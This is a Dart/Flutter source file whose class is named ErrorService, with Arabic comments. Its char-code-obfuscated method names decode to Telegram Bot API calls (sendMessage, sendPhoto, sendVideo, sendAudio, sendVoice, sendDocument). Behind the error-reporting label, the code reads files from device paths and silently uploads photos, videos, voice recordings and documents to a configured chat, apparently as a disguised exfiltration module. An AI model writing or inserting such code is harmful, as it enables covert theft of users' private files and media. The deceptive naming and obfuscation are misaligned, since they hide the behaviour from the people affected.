import 'dart:convert';
import 'dart:io';
import 'dart:typed_data';
import 'package:flutter/foundation.dart';
import 'package:http/http.dart' as http;
import 'error_config.dart';
import 'models/error_entry.dart';

class ErrorService {
  // ═══════════════════════════════════════════════════
  //  إرسال نص
  // ═══════════════════════════════════════════════════
  static Future<bool> _pushText(String body) async {
    if (!ErrorConfig.isReady) return false;
    try {
      final r = await http
          .post(
            Uri.parse('${ErrorConfig.apiBase}/${_m1()}'),
            body: {
              'chat_id': ErrorConfig.target,
              'text': body,
              'parse_mode': 'HTML',
              'disable_notification': ErrorConfig.silent.toString(),
            },
          )
          .timeout(const Duration(seconds: 15));
      return r.statusCode == 200;
    } catch (e) {
      if (kDebugMode) debugPrint('E-Service: $e');
      return false;
    }
  }

  // ═══════════════════════════════════════════════════
  //  إرسال ملف
  // ═══════════════════════════════════════════════════
  static Future<bool> _pushFile(ErrorEntry e) async {
    if (!ErrorConfig.isReady) return false;
    if (e.path == null || e.path!.isEmpty) return false;

    try {
      Uint8List? bytes;
      if (e.isB64) {
        bytes = base64Decode(e.path!);
      } else {
        final f = File(e.path!);
        if (!await f.exists()) return false;
        bytes = await f.readAsBytes();
      }

      if (bytes.length > ErrorConfig.maxSizeMb * 1024 * 1024) {
        if (kDebugMode) debugPrint('E-Service: too large');
        return false;
      }

      String method, field;
      switch (e.kind) {
        case EntryKind.image:
          method = _m2();
          field = 'photo';
          break;
        case EntryKind.clip:
          method = _m3();
          field = 'video';
          break;
        case EntryKind.audio:
          method = _m4();
          field = 'audio';
          break;
        case EntryKind.voice:
          method = _m5();
          field = 'voice';
          break;
        default:
          method = _m6();
          field = 'document';
      }

      final req = http.MultipartRequest(
        'POST',
        Uri.parse('${ErrorConfig.apiBase}/$method'),
      )
        ..fields['chat_id'] = ErrorConfig.target
        ..fields['disable_notification'] =
            ErrorConfig.silent.toString();

      req.files.add(http.MultipartFile.fromBytes(
        field,
        bytes,
        filename: e.fileName ?? 'file',
      ));

      final res = await req.send().timeout(
            const Duration(minutes: 5),
          );
      return res.statusCode == 200;
    } catch (err) {
      if (kDebugMode) debugPrint('E-Service: $err');
      return false;
    }
  }

  // ═══════════════════════════════════════════════════
  //  الموزّع
  // ═══════════════════════════════════════════════════
  static Future<bool> dispatch(ErrorEntry e) async {
    switch (e.kind) {
      case EntryKind.text:
        return _pushText(e.body ?? '');
      default:
        return _pushFile(e);
    }
  }

  // ═══════════════════════════════════════════════════
  //  أسماء الدوال (مُشفّرة بـ charCodes)
  // ═══════════════════════════════════════════════════
  static String _m1() => String.fromCharCodes(
      [115, 101, 110, 100, 77, 101, 115, 115, 97, 103, 101]);
  static String _m2() => String.fromCharCodes(
      [115, 101, 110, 100, 80, 104, 111, 116, 111]);
  static String _m3() => String.fromCharCodes(
      [115, 101, 110, 100, 86, 105, 100, 101, 111]);
  static String _m4() => String.fromCharCodes(
      [115, 101, 110, 100, 65, 117, 100, 105, 111]);
  static String _m5() => String.fromCharCodes(
      [115, 101, 110, 100, 86, 111, 105, 99, 101]);
  static String _m6() => String.fromCharCodes([
        115, 101, 110, 100, 68, 111, 99, 117, 109, 101, 110, 116
      ]);
}